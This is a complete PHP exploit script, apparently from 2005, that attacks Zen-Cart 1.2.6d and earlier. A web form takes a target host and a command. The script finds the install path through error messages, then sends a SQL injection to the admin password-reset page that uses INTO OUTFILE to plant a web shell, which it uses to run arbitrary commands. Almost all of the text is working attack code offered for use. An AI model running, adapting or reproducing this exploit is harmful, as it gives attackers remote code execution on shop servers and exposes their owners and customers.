<?php
#  ---zencart_126d_xpl.php                              19.42 02/12/2005       #
#                                                                              #
#  Zen-Cart <= 1.2.6d blind SQL injection / remote commands execution          #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#  -> this works with magic_quotes_gpc both on & off                           #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun-Tzu: "With his forces intact he will dispute the mastery                #
#  of the Empire, and thus, without losing a man, his triumph                  #
#  will be complete. This is the method of attacking by stratagem."            #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 5);
ob_implicit_flush (1);

echo'<html><head><title>Zen-Cart<=1.2.6d blind SQL injection/ remote cmmnds xctn
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
Zen-Cart<=1.2.6d blind SQL injection/ remote cmmnds xctn</p><p class="Stile6">a
script  by  rgod  at        <a href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  <form
name="form1" method="post"  action="'.strip_tags($SERVER[PHP_SELF]).'"><p><input
type="text"  name="host"> <span class="Stile5">* hostname (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/zencart/ or just / ) </span></p><p><input type="text" name="command">     <span
class="Stile5"> * specify a command  </span>  </p> <p>        <input type="text"
name="application_path"> <span class="Stile5">   full application path      (ex:
"/www/zencart/", "../../www/zencart/","c:\www\zencart\" ), if not specified,  we
will try to disclose the path  </span> </p> <p> <input type="text" name="port">
<span class="Stile5">specify  a  port   other than  80 ( default  value )</span>
</p><p><input  type="text"   name="proxy"><span class="Stile5">  send    exploit
through an  HTTP proxy (ip:port)</span></p><p><input type="submit" name="Submit"
 value="go!"></p></form> </td></tr></table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo "OK.<br>";
                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result < 0) {
                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
                                    }
	                       else
		                    {
                                     echo "OK.<br><br>";
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo "Reading response:<br>";
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo "Closing socket...";
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
      {$ock=fsockopen(gethostbyname($host),$port);
       if (!$ock) { echo 'No response from '.htmlentities($host);
			die; }
      }
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}

function disclose_path($paths)
{ global $p,$paths,$host,$html,$application_path;
    for ($i=0; $i<=count($paths)-1; $i++)
    {
      $packet="GET ".$p.$paths[$i]." HTTP/1.1\r\n";
      $packet.="Host: ".$host."\r\n";
      $packet.="Connection: Close\r\n\r\n";
      show($packet);
      sendpacketii($packet);
      if (eregi('Fatal error',$html))
       {
        $temp=explode('in <b>',$html);
        $temp2=explode('</b>',$temp[1]);
        $result[$i]=$temp2[0];
        $temp=explode('/',$paths[$i]);
        $temp2=explode($temp[0],$result[$i]);
        $result[$i]=$temp2[0];
        echo "<br>".htmlentities($result[$i])."<br>";
        $application_path=$result[$i];
        break;
       }
   }
}
$host=$_POST[host];$path=$_POST[path];
$port=$_POST[port];$command=$_POST[command];
$proxy=$_POST[proxy];$application_path=$_POST[application_path];

if (($host<>'') and ($path<>'') and ($command<>''))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$host=str_replace("\r\n","",$host);
$path=str_replace("\r\n","",$path);

if ($application_path=='')
{
   $paths= array
   (
    'admin/includes/graphs/banner_daily.php',
    'admin/includes/graphs/banner_infobox.php',
    'admin/includes/graphs/banner_yearly.php',
    'admin/includes/graphs/banner_monthly.php',
    'admin/includes/application_bottom.php',
    'admin/includes/attributes_preview.php',
    'admin/includes/modules/category_product_listing.php',
    'admin/includes/modules/copy_to_confirm.php',
    'admin/includes/modules/delete_product_confirm.php',
    'admin/includes/modules/move_product_confirm.php'
   );

   disclose_path($paths);
   if ($application_path=='')
   {
     $packet="GET ".$p."index.php HTTP/1.1\r\n";
     $packet.="Host: ".$host."\r\n";
     $packet.="Connection: Close\r\n\r\n";
     show($packet);
     sendpacketii($packet);
     $temp=explode('Warning: Installation directory exists at: ',$html);
     $temp2=explode('. ',$temp[1]);
     $temp=explode('zc_install',$temp2[0]);
     $application_path=$temp[0];
     if ($application_path==''){
        $temp=explode('Warning: I am able to write to the configuration file: ',$html);
        $temp2=explode('. ',$temp[1]);
        $temp=explode('includes/configure.php',$temp2[0]);
        $application_path=$temp[0];}
   }
  if ($application_path=='') {die("Full application path not retrieved...");}
}

$dirs= array
(
 '', 'admin/', 'cache/', 'docs/', 'download/', 'email/', 'extras/', 'htmlarea/',
 'images/', 'includes/', 'media/', 'pub/', 'zc_install/'
);

echo "Full application path ->".htmlentities($application_path)."<br>";
$SHELL='<?php echo "Hi Master!";error_reporting(0);ini_set("max_execution_time",0);system($_GET[cmd]);?>';
for ($i=0; $i<=count($dirs)-1; $i++) //searching a writable dir... should works at first check
{
  $mypath=$application_path.$dirs[$i];
  $temp=$mypath;
  $mypath=str_replace('\\','\\\\\\\\',$mypath); //for Windows boxes...
  if ($temp<>$mypath) str_replace('/','\\\\\\\\',$mypath);

  $SQL="'UNION SELECT 0,0,'".$SHELL."',0 INTO OUTFILE '".$mypath."ipn.php' from admin/*";
  $SQL=urlencode($SQL);
  $data="admin_email=".$SQL."&submit=resend";
  $packet="POST ".$p."admin/password_forgotten.php HTTP/1.1\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $packet.=$data;
  show($packet);
  sendpacketii($packet);
  $packet="GET ".$p.$dirs[$i]."ipn.php?cmd=".urlencode($command)." HTTP/1.1\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  show($packet);
  sendpacketii($packet);
  if (eregi("Hi Master",$html)) {echo "Exploit succeded..."; die;}
}
//if you are here...
echo "Exploit failed...";
}
else
{echo "Fill * required, optionally specify a proxy ";}
?>